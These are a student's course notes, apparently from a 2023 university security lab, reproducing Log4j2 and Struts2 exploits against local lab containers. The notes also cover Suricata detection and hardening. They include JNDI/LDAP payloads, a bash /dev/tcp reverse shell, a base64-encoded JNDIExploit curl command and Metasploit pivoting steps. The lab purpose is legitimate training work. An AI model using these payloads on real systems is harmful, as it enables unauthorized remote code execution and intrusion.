# 2023网安暑期攻防学习记录

**记录2023网安暑期攻防小学期，持续更新**

- 课程Wiki：[2023年 - 传媒网安教学 Wiki (c4pr1c3.github.io)](https://c4pr1c3.github.io/cuc-wiki/cp/2023/index.html)
- 课程视频：[[网络安全(2021) 综合实验]](https://www.bilibili.com/video/BV1p3411x7da?p=19&vd_source=640d60cfe2696fffb930fdf01e0aba1d)
- 视频配套课件地址:[网络安全 (c4pr1c3.github.io)](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/漏洞原理详解)

## 7.10

### 课程学习笔记

网络安全综合实验：开源信息系统搭建、加固与漏洞攻防

- 内容提纲

  - 基础运行环境准备
  - 漏洞攻防环境现状
  - 漏洞攻防环境搭建
  - 漏洞攻击
  - 漏洞利用检测
  - 漏洞利用防御与加固

- 基础虚拟机环境搭建**必知必会**：

  - 1.安装后虚拟机网卡没有分配到IP?

    - 修改配置文件：![image-20230710173343531](IMG/修改配置文件.png)

    - ![image-20230710173436296](IMG/修改配置文件内容.png)

    - ```
      再执行：
      sudo ifdown eth0 && sudo ifup eth0
      sudo ifdown eth1 && sudo ifup eth1
      ```

  - 2.SSH服务启用与SSH免密登录

    - ![image-20230710173916276](IMG/免密登录.png)
    - [可选]vscode remote on win10

  - 3.克隆出来的虚拟机IP地址—样?

  - 4.**多重加载镜像**制作与使用

  - 5.备份与还原

    - 虚拟机快照与还原
    - 默认配置文件编辑前备份

- 网络：

  - 网卡1：NAT
  - 网卡2：Host-only![image-20230710172921152](IMG/网卡配置.png)

- 希望用**终端**，不用图形界面

#### 学习资源

- [本课程第 7 章课件中推荐过的训练学习资源](https://c4pr1c3.github.io/cuc-ns-ppt/chap0x07.md)
  - https://github.com/c4pr1c3/ctf-games 获得本课程定制的 Web 漏洞攻防训练环境※

  - [upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场](https://github.com/c0ny1/upload-labs)

  - [PHP XXE 漏洞与利用源代码分析示例](https://github.com/vulnspy/phpaudit-XXE)

  - [vulhub 提供的 XXE 漏洞学习训练环境](https://github.com/vulhub/vulhub/tree/master/php/php_xxe)

  - [python-xxe](https://github.com/c4pr1c3/python-xxe)

  - [sqli-labs](https://github.com/c4pr1c3/sqli-labs) | [sqli-labs 国内 gitee 镜像](https://gitee.com/c4pr1c3/sqli-labs)

  - [一个包含php,java,python,C#等各种语言版本的XXE漏洞Demo](https://github.com/c0ny1/xxe-lab)

  - [upload-labs 一个使用 PHP 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场](https://github.com/c0ny1/upload-labs)

#### 推荐靶场

[vulhub](https://github.com/topics/vulhub)

- [vulhub/vulhub](https://github.com/vulhub/vulhub)
- [fofapro/vulfocus](https://github.com/fofapro/vulfocus)
- [sqlsec/ssrf-vuls](https://github.com/sqlsec/ssrf-vuls)

####  vulfocus快速上手

[c4pr1c3/ctf-games - fofapro/vulfocus](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus)

#### 渗透测试与网络入侵的对比

![image-20230710193006713](IMG/渗透测试与网络入侵对比.png)

## 7.11

#### 从单个漏洞靶标开始

> 一切来自于 **用户输入** 的数据都是不可信的。

1. 找到靶标的【访问入口】
2. 收集【威胁暴露面】信息
3. 检测漏洞存在性
4. 验证漏洞可利用性
5. 评估漏洞利用效果

进入容器：

```
docker exec -it 容器名 bash
```

![image-20230711102419958](IMG/进入容器.png)

```
查看可用的登录shell：
cat /etc/shells
```

根据环境变量写：

![image-20230711102510727](IMG/进入容器2.png)

拷贝容器内的文件到虚拟机内：

```
docker cp 容器名:/demo/demo.jar ./
```

![image-20230711102547023](IMG/拷贝文件.png)

对jar包反编译

6.3.4有**DNSlog使用指南**

## 7.13

### 漏洞防护技术原理与应用

- 学习一点漏洞防护技术原理与应用：
  - [(100条消息) 信息安全-网络安全漏洞防护技术原理与应用_虚拟补丁_learning-striving的博客-CSDN博客](https://blog.csdn.net/qq_43874317/article/details/126689320)
  - [用于渗透测试的10种漏洞扫描工具 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/159163210)

漏洞分类：

- **普通漏洞：**指相关漏洞信息**已经广泛公开**，安全厂商已经有了解决修补方案
- **零日漏洞：**特指系统或软件中**新发现的**、尚未提供补丁的漏洞。零日漏洞通**常被用来实施\**定向攻击\****( Targeted Attacks)

漏洞时刻威胁着网络系统的安全，要实现网络系统安全，关键问题之一就是**解决漏洞问题，包括\*漏洞检测、漏洞修补、漏洞预防\***等

网络信息系统的漏洞**主要来自两个方面**

1. **非技术性安全漏洞：**涉及管理组织结构、管理制度、管理流程、人员管理等
2. **技术性安全漏洞**：主要涉及网络结构、通信协议、设备、软件产品、系统配置、应用系统等

无论是对攻击者还是防御者来说，网络安全漏洞信息获取都是十分必要的

- **攻击者：**通过及时掌握新发现的安全漏洞，可以更有效地实施攻击
- **防御者：**利用漏洞数据，做到及时补漏，堵塞攻击者的入侵途径

#### 漏洞扫描器

**漏洞扫描器**是常用的网络安全工具，按照扫描器运行的环境及用途，漏洞扫描器主要分三种

1. **主机漏洞扫描器**
- <u>不需要通过建立网络连接就可以进行</u>
- 其技术原理：一般是通过<u>检查本地系统中关键性文件</u>的内容及安全属性，来发现漏洞，如配置不当、用户弱口令、有漏洞的软件版本等。主机漏洞扫描器的<u>运行与目标系统在同一主机上，并且只能进行单机检测</u>
2. 网络漏洞扫描器
  - 通过<u>与待扫描的目标机建立网络连接后，发送特定网络请求进行漏洞检查</u>
  - 与主机漏洞扫描的区别：在于网络漏洞扫描器需要<u>与被扫描目标建立网络连接</u>
  - 优点：便于远程检查联网的目标系统
  - 缺点：由于没有目标系统的本地访问权限，只能获得有限的目标信息，检查能力受限于各种网络服务中的漏洞检查，如Web、 FTP、TeInet、SSH、POP3、SMTP、SNMP等

3. **专用漏洞扫描器**
  - 是主要针对<u>特定系统的安全漏洞检查工具</u>，如数据库漏洞扫描器、网络设备漏洞扫描器、Web漏洞扫描器、工控漏洞扫描器

#### 网络安全漏洞处置技术与应用

- 网络安全漏洞发现技术

  - 研究表明，攻击者要成功入侵，关键在于**及早发现和利用目标信息系统的安全漏洞**。目前，网络安全漏洞发现技术成为网络安全保障的关键技术。然而，对于软件系统而言，其功能性错误容易发现，但软件的安全性漏洞不容易发现

  - 网络安全漏洞的发现方法主要依赖于**人工安全性分析**、**工具自动化检测**及**人工智能辅助分析**。

  - 安全漏洞发现的通常方法：是将已发现的安全漏洞进行总结，形成一个漏洞特征库，然后利用该漏洞库，通过人工安全分析或者程序智能化识别

  - 漏洞发现技术：主要有<u>文本搜索、词法分析、范围检查、状态机检查、错误注入、模糊测试、动态污点分析、形式化验证</u>等（匹配技术）

  - 网络安全漏洞修补技术
    - 补丁管理是一个系统的、周而复始的工作
    - 主要由六个环节组成：分别是现状分析、补丁跟踪、补丁验证、补丁安装、应急处理和补丁检查

- 网络安全漏洞利用防范技术

  - 主要针对漏洞触发利用的条件进行干扰或拦截，以防止攻击者成功利用漏洞

  - 常见的网络安全漏洞利用防范技术如下：
    - **地址空间随机化技术**：缓冲区溢出攻击是利用缓冲区溢出漏洞所进行的攻击行动，会以shelIcode地址来覆盖程序原有的返回地址。地址空间随机化(ASLR)就是通过对程序加载到内存的地址进行随机化处理，使得攻击者不能事先确定程序的返回地址值，从而降低攻击成功的概率
    - **数据执行阻止(DEP)**：是指操作系统通过对特定的内存区域标注为非执行，使得代码不能够在指定的内存区域运行。利用DEP，可以有效地保护应用程序的堆栈区域，防止被攻击者利用
    - **SEHOP**：原理是防止攻击者利用Structured Exception Handler (SEH)重写
    - **堆栈保护**：技术原理是通过设置堆栈完整性标记以检测函数调用返回地址是否被篡改，从而阻止攻击者利用缓冲区漏洞
    - **虚拟补丁**：工作原理是对尚未进行漏洞永久补丁修复的目标系统程序，在不修改可执行程序的前提下，检测进入目标系统的网络流量而过滤掉漏洞攻击数据包，从而保护目标系统程序免受攻击。虚拟补丁通过入侵阻断、Web防火墙等相关技术来实现给目标系统程序“打补丁”，使得黑客无法利用漏洞进行攻击

## 7.16

### 配置环境

- kali版本：

  - ```
    Distributor ID: Kali
    Description:    Kali GNU/Linux Rolling
    Release:        2023.2
    Codename:       kali-rolling
    ```

- 网络：
  - ![image-20230718172318633](IMG/网络配置.png)
  - Victim：**192.168.56.108**
  - Attacker：**192.168.56.109**
- 基本配置：

```shell
# 确保使用 root 权限操作
sudo su -

# 养成良好配置习惯：备份配置文件
cp /etc/network/interfaces /etc/network/interfaces.bak

# 非交互式配置文件内容追加
cat << EOF >> /etc/network/interfaces
allow-hotplug eth0
iface eth0 inet dhcp
allow-hotplug eth1
iface eth1 inet dhcp
EOF

# 手动重启指定网卡
ifdown eth{0,1} && ifup eth{0,1}

# 配置 SSH 服务开机自启动
systemctl enable ssh

# 启动 SSH 服务
systemctl start ssh
```

- 查看ip：**192.168.56.108**
  - ![image-20230722170020062](IMG/查看ip.png)
- 主机ssh连接：
  - ![image-20230716200904237](IMG/ssh连接.png)

### docker配置

- 使用 `docker-compose` 一键搭建「漏洞练习环境」。

  **注意检查 docker-compose.yml 中定义的各个容器服务的监听端口** ，如果遇到端口占用冲突报错可以自行修改监听端口为其他本机可用端口。

  ```shell
  # 一次获取所有文件（包括所有子模块管理的文件）
  git clone https://github.com/c4pr1c3/ctf-games.git --recursive
  
  cd ctf-games
  
  # （可选）单独更新子模块
  git submodule init && git submodule update
  ```

- 安装docker和拉取镜像：

  - ![image-20230716201632556](IMG/安装docker和拉取镜像.png)

  - 在安装docker前应该先执行

    - ```shell
      apt-get update  
      apt-get upgrade
      ```

    - 不然可能会报错——“Package 'docker' has no installation candidate”

- 安装docker成功，查看docker版本：
  - ![image-20230716210836528](IMG/查看docker版本.png)

- 拉取 vulfocus 镜像：
  - ![image-20230716211749793](IMG/拉取 vulfocus 镜像.png)

- 对 [fofapro/vulfocus](https://github.com/fofapro/vulfocus) 提供傻瓜式二次封装，启动方式简化为
  - 1.`bash start.sh`
    - 执行该命令要加sudo：
    - ![image-20230716214647493](IMG/执行bash.png)
  - 2.选择对外提供访问 `vulfocus-web` 的 IP
    - ![image-20230716214809358](IMG/访问网站.png)
  - 3.打开浏览器访问 admin / admin
    - 登录：
      - Usrname：admin 

      - Password：admin
  - 4.【镜像管理】-【镜像管理】-【一键同步】
  - 5.搜索感兴趣的漏洞镜像-【下载】
  - 6.镜像下载完毕后，【首页】，随时可以【启动】镜像开始漏洞攻防实验了

## 7.17

### 漏洞复现

#### 漏洞攻击一般流程

- 1.找到靶标的【访问入口】

- 2.收集【威胁暴露面】信息

- 3.检测漏洞存在性

  - 确认受漏洞影响组件的【版本号】
  - 源代码审计——靶标环境漏洞源代码反编译

- 4.验证漏洞可利用性

  - 使用PoC手动测试**${jndi:ldap://0qxc3d.dnslog.cn/exp}**

    - 此处域名需要自己手动获取专属随机子域名

  - ```bash
    # 自行替换其中的靶标 URL 和  ldap 协议域名
    curl -X POST http://192.168.56.216:49369/hello -d payload='"${jndi:ldap://0qxc3d.dnslog.cn/exp}"'
    ```

  - ```shell
    git clone https://github.com/fullhunt/log4j-scan && cd log4j-scan
    
    # 如果没有安装过 pip
    sudo apt update && sudo apt install -y python3-pip
    
    pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
    
    # 修改 log4j-scan.py
    # 手动编辑
    # post_data_parameters = ["username", "user", "email", "email_address", "password"]
    # 替换为以下内容
    # post_data_parameters = ["username", "user", "email", "email_address", "password", "payload"]
    # 【或者】使用以下代码无脑替换
    sed -i.bak 's/password"/password", "payload"/' log4j-scan.py
    
    # 自行替换其中的靶标 URL
    python3 log4j-scan.py --request-type post -u http://192.168.56.216:49369/hello
    # [•] CVE-2021-44228 - Apache Log4j RCE Scanner
    # [•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
    # [•] Secure your External Attack Surface with FullHunt.io.
    # [•] Initiating DNS callback server (interact.sh).
    # [%] Checking for Log4j RCE CVE-2021-44228.
    # [•] URL: http://192.168.56.216:49369/hello
    # [•] URL: http://192.168.56.216:49369/hello | PAYLOAD: ${jndi:ldap://192.168.56.216.379o3109409t4u4rlr7972p9q103qt2zq.interact.sh/8tvw1m5}
    # [•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
    # [•] Waiting...
    # [!!!] Target Affected
    # {'timestamp': '2021-12-21T02:55:30.472289751Z', 'host': '192.168.56.216.379o3109409t4u4rlr7972p9q103qt2zq.379o3109409t4u4rlr7972p9q103qt2zq.interact.sh', 'remote_address': '219.141.176.26'}
    ```

- 5.评估漏洞利用效果

### 漏洞一、命令执行-Log4j2远程命令执行

**（CVE-2021-44228）**

#### 漏洞简介

Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。

#### 实验过程

- 启动靶机：
  - ![image-20230716220249830](IMG/启动靶机.png)

- 访问[192.168.56.108:51039](http://192.168.56.108:51039/)：
  - ![image-20230716220417224](IMG/访问靶场.png)

- 点击<u>?????</u>后：
  - ![image-20230716220450088](IMG/点击后.png)

##### 1.log4j2检测漏洞存在性——源码分析

虚拟机查看当前容器数量，会发现多了一台：

```shell
docker ps
```

![image-20230717231304070](IMG/查看容器数量.png)

进入当前的容器：

```shell
sudo docker exec -it youthful_satoshi sh
```

查找该容器的jar包：

![image-20230717231635496](IMG/进入靶场容器.png)

将demo.jar拷贝到虚拟机中：

```shell
sudo docker cp youthful_satoshi:/demo/demo.jar ./
```

![image-20230717231902966](IMG/拷贝.png)

将jar文件用jd-gui分析：

![image-20230717232927068](IMG/jd-gui分析.png)

可查看到源码的具体漏洞

```java
 /* 缺陷代码片段 */
    logger.error("{}", payload);
    logger.info("{}", payload);
    logger.info(payload);
    logger.error(payload);
```

##### 2.log4j2验证漏洞可利用性——DNSLog验证

测试该网站存在不存在Apache log4j2漏洞：

通过DNSLog平台（[http://www.dnslog.cn/](https://link.zhihu.com/?target=http%3A//www.dnslog.cn/)）

![image-20230717233316119](IMG/DNSLog.png)

获取到域名http://0o9zuq.dnslog.cn，构造payload ${jndi:ldap://http://0o9zuq.dnslog.cn}

###### 命令行curl

```shell
curl -X POST http://192.168.56.108:54307/hello -d 'payload="${jndi:ldap://0o9zuq.dnslog.cn/exp}"'
```

###### 报错

这里报错**Request method ‘POST‘ not supported Method Not Allowed**

```
{"timestamp":"2023-07-22T09:29:59.402+00:00","status":404,"error":"Not Found","path":"/hello"} 
```

![image-20230722173010849](IMG/报错.png)

在网上查询了一下报错原因：[(100条消息) Request method ‘POST‘ not supported Method Not Allowed_cy谭的博客-CSDN博客](https://blog.csdn.net/zhan107876/article/details/111595338)

也在不同的虚拟机和不同电脑的虚拟机进行了实验，我认为应该是搭建的vulfocus现在的版本的问题，GET请求是可以正常进行的，curl也能成功访问到网站，但是不能用curl命令发送POST请求。

以下是使用Burpsuite手动发送POST请求👇

###### Burpsuite

使用Burpsuite进行抓包：

![image-20230721001909643](IMG/Burpsuite抓包.png)

替换payload参数：

![image-20230721002016626](IMG/替换payload参数.png)

对替换部分的payload字段进行编码：

![image-20230721002053379](IMG/编码.png)



编码后再次发送请求包：

![image-20230721001730940](IMG/再次发送请求包.png)

在DNSLog网站成功接收到解析记录：

![image-20230721001811746](IMG/收到解析记录.png)

##### 3.log4j2验证漏洞可利用性——log4j-scan

攻击者主机attacker上下载log4j-scan

```shell
git clone https://github.com/fullhunt/log4j-scan && cd log4j-scan
```

如果没有下载pip的话下载

```shell
sudo apt update && sudo apt install -y python3-pip
```

安装相关配置

```shell
pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple

# 修改 log4j-scan.py
# 手动编辑
# post_data_parameters = ["username", "user", "email", "email_address", "password"]
# 替换为以下内容
# post_data_parameters = ["username", "user", "email", "email_address", "password", "payload"]
# 【或者】使用以下代码无脑替换
sed -i.bak 's/password"/password", "payload"/' log4j-scan.py
```

修改 log4j-scan.py：

![image-20230722174259279](IMG/修改 log4j-scan.png)

执行log4j-scan.py：

```shell
# 自行替换其中的靶标 URL
python3 log4j-scan.py --request-type post -u http://192.168.56.108:41510/hello
```

![image-20230722181121151](IMG/执行py报错.png)

发现报错:

```
requests.exceptions.ConnectionError: HTTPSConnectionPool(host='interact.sh', port=443): Max retries exceeded with url: /register (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f2c429f4310>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
```

- 经过查询，发现该错误可能是因为：

  - http的连接数超过最大限制，默认的情况下连接是Keep-alive的，所以这就导致了服务器保持了太多连接而不能再新建连接。

  - 也可能是程序请求速度过快。

- 暂时还没有好的解救办法

##### 4. log4j2评估漏洞利用效果

攻击者主机attacker启动7777端口，等待受害者主机victim反弹回连getshell

```shell
nc -l -p 7777
```

受害者主机进入容器中并构造反弹shell的payload

```
bash -i >& /dev/tcp/192.168.56.109/7777 0>&1
```

![image-20230722183633143](IMG/评估漏洞利用效果.png)

攻击者可以窥探受害者主机：

![image-20230722183832344](IMG/攻击者主机窥探.png)

得到flag：

![image-20230722183932794](IMG/flag.png)

###### JNDIExploit工具

攻击者主机attacker上下载[`JNDIExploit`工具](https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)

```shell
wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip
```

![image-20230722190214167](IMG/JNDIExploit_install.png)

下载不了我直接下载好了拖进去的）

解压

```shell
unzip JNDIExploit.v1.2.zip
```

计算下载工具包的哈希值

![image-20230722190119514](IMG/计算哈希.png)

攻击者主机监听受害者主机的1389和8080端口

```shell
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.56.109
```

![image-20230722190630986](IMG/攻击者监听.png)

攻击者主机等待 victim 反弹回连 getshell：

![image-20230722190749171](IMG/等待 victim 反弹回连 getshell.png)

受害者主机执行：

```shell
curl http://192.168.56.108:9495/hello -d 'payload=${jndi:ldap://192.168.56.109:1389/TomcatBypass/Command/Base64/'$(ech
o -n 'bash -i >& /dev/tcp/192.168.56.109/7777 0>&1' | base64 -w 0 | sed 's/+/%252B/g' | sed 's/=/%253d/g')'}' 
```

报错：

```
{"timestamp":"2023-07-22T11:15:21.268+0000","status":405,"error":"Method Not Allowed","message":"Request method 'POST' not supported","path":"/hello"}
```

![image-20230722193208609](IMG/报错2.png)

还是不能通过curl命令发送post请求到该ip地址上，所以导致不能执行后续操作，也不能得到通过该工具直接窥视受害者主机的效果

##### 5.log4j2漏洞利用检测

###### 基本方法

- 面向网络流量的深度包检测
- 运行时应用自我保护
  - Runtime Application Self-Protection (RASP)

###### 漏洞利用流量检测实战

```shell
# 启动靶机镜像
docker run -d --name log4shell -p 5555:8080 vulfocus/log4j2-rce-2021-12-09:latest

# 启动 suricata 检测容器
# 此处 eth1 对应靶机所在虚拟机的 host-only 网卡 IP
docker run -d --name suricata --net=host -e SURICATA_OPTIONS="-i eth1" jasonish/suricata:6.0.4

# 更新 suricata 规则，更新完成测试完规则之后会自动重启服务
docker exec -it suricata suricata-update -f

# 重启 suricata 容器以使规则生效
─(kali㉿kali)-[~/Desktop/ctf-games/fofapro/vulfocus]
└─$ sudo docker restart suricata
suricata

# 监视 suricata 日志
# 重复前述【漏洞攻击】实验
┌──(kali㉿kali)-[~/Desktop/ctf-games/fofapro/vulfocus]
└─$ sudo docker exec -it suricata tail -f /var/log/suricata/fast.log

07/24/2023-07:20:17.317100  [**] [1:2221034:1] SURICATA HTTP Request unrecognized authorization method [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP} 192.168.56.1:59471 -> 192.168.56.108:80
07/24/2023-07:20:17.318160  [**] [1:2221034:1] SURICATA HTTP Request unrecognized authorization method [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP} 192.168.56.1:59645 -> 192.168.56.108:80
07/24/2023-07:22:03.909195  [**] [1:2034647:1] ET EXPLOIT Apache log4j RCE Attempt (http ldap) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/24/2023-07:22:03.909195  [**] [1:2034649:1] ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/24/2023-07:22:03.909195  [**] [1:2034700:1] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/24/2023-07:22:03.909195  [**] [1:2034757:2] ET EXPLOIT Apache log4j RCE Attempt (http ldap) (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/24/2023-07:22:03.909195  [**] [1:2034759:1] ET EXPLOIT Apache log4j RCE Attempt (tcp ldap) (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/24/2023-07:22:03.909195  [**] [1:2034800:2] ET EXPLOIT Apache log4j RCE Attempt - lower/upper TCP Bypass M2 (Outbound) (CVE-2021-44228) [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/24/2023-07:22:03.909195  [**] [1:2034661:1] ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol TCP (CVE-2021-44228) [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/24/2023-07:22:03.909195  [**] [1:2034783:2] ET HUNTING Possible Apache log4j RCE Attempt - Any Protocol TCP (Outbound) (CVE-2021-44228) [**] [Classification: Misc activity] [Priority: 3] {TCP} 192.168.56.109:57084 -> 192.168.56.108:56018
07/25/2023-06:39:02.610033  [**] [1:2022973:1] ET POLICY Possible Kali Linux hostname in DHCP Request Packet [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {UDP} 192.168.56.108:68 -> 192.168.56.100:67
07/25/2023-06:39:06.685202  [**] [1:2210058:1] SURICATA STREAM suspected RST injection [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP} 192.168.56.108:47442 -> 192.168.56.1:58621
07/25/2023-06:39:06.934684  [**] [1:2210058:1] SURICATA STREAM suspected RST injection [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP} 192.168.56.108:47442 -> 192.168.56.1:58619
07/25/2023-06:39:06.934719  [**] [1:2210058:1] SURICATA STREAM suspected RST injection [**] [Classification: Generic Protocol Command Decode] [Priority: 3] {TCP} 192.168.56.108:47442 -> 192.168.56.1:58618
07/25/2023-06:40:32.558055  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 192.168.56.108:46472 -> 192.168.56.109:7777
```

![image-20230725144217762](IMG/漏洞利用流量检测.png)

##### 6.log4j2漏洞利用防御与加固

下图为log4j2漏洞利用防御与加固

- 盾牌位置表视不同区域的防御方式
  - 如防火墙掐断如${jndi:ldap://edil.xs/x}等请求
  - 攻击代码如果到达日志程序，可以替换成无漏洞的框架
  - 或者是禁用jndi查询
- 多种方式防御log4j2 JNDI 攻击

![](IMG/log4j2_attack.png)

### 漏洞二、跨网段多靶标渗透场景攻防

**CVE-2020-17530 Struts2**

#### 漏洞简介

Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。在特定的环境下，远程攻击者通过构造 恶意的OGNL表达式 ,可造成 任意代码执行

Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞(CVE-2020-17530)，在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成**远程代码执行**，可能造成**控制服务器**等危害。S2-061是对S2-059沙盒进行的绕过

#### 场景安装与配置

网卡配置：

![image-20230725151157071](IMG/场景网卡配置.png)

该场景需要3种漏洞镜像：`struts2-cve-2020-17530`、`weblogic-cve-2019-2725`、`nginx-php-flag`

下载三种漏洞，并按如下图摆放：

![image-20230725154530974](IMG/搭建场景.png)

![image-20230725154608017](IMG/搭建完成.png)

在容器中启动场景，查看相应的镜像信息：

![image-20230725160803072](IMG/查看镜像.png)

会发现如刚刚搭建的一样，有一台`struts2-cve-2020-17530`、两台`weblogic-cve-2019-2725`、一台`nginx-php-flag`

#### 场景启动

- 进入【场景】，启动已经搭建好的 `dmz` 场景场景
- 我们需要访问的端口号为访问地址后端口号
- 访问地址：Victim IP：端口号
  - ![image-20230725160736365](IMG/访问地址.png)
- 打开浏览器，输入 `靶机IP:端口号`
  - ![image-20230725160644384](IMG/访问.png)

#### 捕获指定容器的上下行流量

```shell
# 建议放到 tmux 会话
#查看目标容器名称或ID
docker ps

container_name="<替换为目标容器名称或ID>"

docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
```

> 为后续的攻击过程「分析取证」保存流量数据

![image-20230725171324486](IMG/保存流量数据.png)

#### 攻破靶标1

**metasploit 基础配置**

```shell
# 更新 metasploit
sudo apt install -y metasploit-framework

# 初始化 metasploit 本地工作数据库
sudo msfdb init
```

![image-20230725163828952](IMG/初始化数据库.png)

启动 msfconsole：

```shell
msfconsole
```

<img src="IMG/msfconsole.png" alt="image-20230725164217792" style="zoom:67%;" />

确认已连接 pgsql:

```shell
db_status
```

![image-20230725164328462](IMG/db_status.png)

建立工作区:

```shell
workspace -a demo
```

![image-20230725164611472](IMG/建立工作区.png)

search exp in metasploit:

```shell
search struts2 type:exploit
```

![image-20230725165224602](IMG/search_exp.png)

查看 exp 详情:可以直接通过搜索**结果编号**，也可以通过搜索**结果的 Name 字段**

```shell
info 2
```

![image-20230725165402769](IMG/info.png)

**信息收集之服务识别与版本发现**

通过 vulfocus 场景页面看到入口靶标的开放端口:

```shell
db_nmap -p 18972 192.168.56.108 -n -A
```

![image-20230725171712342](IMG/db_nmap.png)

继续完善搜索关键词:

```shell
search S2-059 type:exploit
```

![image-20230725165544398](IMG/完善搜索关键词.png)

使用上述 exp

```shell
use 0
```

查看 exp 可配置参数列表

```shell
show options
```

![image-20230725165745283](IMG/查看 exp 可配置参数列表.png)

查看可用 exp payloads

```shell
show payloads
```

![image-20230725165833464](IMG/payloads.png)

使用合适的 exp payload:

```shell
set payload payload/cmd/unix/reverse_bash
```

![image-20230725170122827](IMG/payload.png)

配置 exp 参数:确保所有 Required=yes 参数均正确配置

```shell
# 靶机 IP
set RHOSTS 192.168.56.108 
# 靶机目标端口
set rport 18972         
# 攻击者主机 IP
set LHOST 192.168.56.109

# 再次检查 exp 配置参数列表
show options
```

![image-20230725171923082](IMG/exp配置参数.png)

打靶：

```
exploit -j
```

![image-20230725172227870](IMG/exploit.png)

如果攻击成功，查看打开的 reverse shell：

```shell
sessions -l
```

![image-20230725172334602](IMG/sessions.png)

进入会话 1：

```shell
sessions -i 1
```

![image-20230725172457834](IMG/进入会话 1.png)

无命令行交互提示信息，试一试 Bash 指令：

```shell
id
```

在/tmp下得到flag

```shell
ls /tmp
# flag-{bmh9815fad5-6cb0-45f9-a8d0-8c0afa77330c}
```

提交flag，可查看当前进度20%

![image-20230725223544160](IMG/提交flag1.png)

#### 建立立足点并发现靶标2-4

```shell
# upgrade cmdshell to meterpreter shell
# 也可以直接 sessions -u 1
search meterpreter type:post
use post/multi/manage/shell_to_meterpreter
show options
set lhost 192.168.56.109
set session 1
run -j

#查看会话
sessions -l
```

![image-20230725224856328](IMG/upgrade_meterpreter_shell.png)

扫描28426 80 22 端口：

```
db_nmap -p 28426,80,22 192.168.56.108 -A -T4 -n
```

![image-20230726200855886](IMG/db_nmap2.png)

查看services：

![image-20230726200949656](IMG/services.png)

查看hosts：

```shell
hosts
```

![image-20230726201048411](IMG/hosts.png)

```shell
# 进入 meterpreter 会话 2
sessions -i 2

# setup pivot: run autoroute
# 查看网卡列表
ipconfig
```

![image-20230725225030711](IMG/查看网卡列表.png)

```shell
# 查看路由表
route
```

![image-20230725225107663](IMG/查看路由表.png)

```shell
# 查看 ARP 表
arp
```

![image-20230725225129324](IMG/查看ARP表.png)

```shell
run autoroute -s 192.170.84.0/24

# 检查 Pivot 路由是否已创建成功
run autoroute -p
```

![image-20230725225225342](IMG/run_autoroute.png)

退出会话2：

```shell
# portscan through pivot
search portscan
use auxiliary/scanner/portscan/tcp
show options
```

![image-20230725225609616](IMG/portscan_through_pivot.png)

```shell
# 根据子网掩码推导
set RHOSTS 192.170.84.2-254
# 根据「经验」
set ports 7001
# 根据「经验」
set threads 10
```

![image-20230726203645641](IMG/设置参数.png)

`exploit` or `run`:

![image-20230726203721427](IMG/run.png)

查看发现的服务列表，发现服务列表里有三台主机的ip，且状态为open

```
 services
```

![image-20230726203925251](IMG/services2.png)

新开一个 ssh 会话窗口 ：检查 1080 端口服务开放情况 

```shell
sudo lsof -i tcp:1080 -l -n -P
```

![image-20230726204324412](IMG/检查 1080 端口服务开放情况 .png)

回到 metasploit 会话窗口:重新进入 shell 会话 

```shell
sessions -i 1 
curl http://192.170.84.2:7001 -vv 
curl http://192.170.84.3:7001 -vv 
curl http://192.170.84.4:7001 -vv
```

![image-20230726204652354](IMG/session1_curl.png)

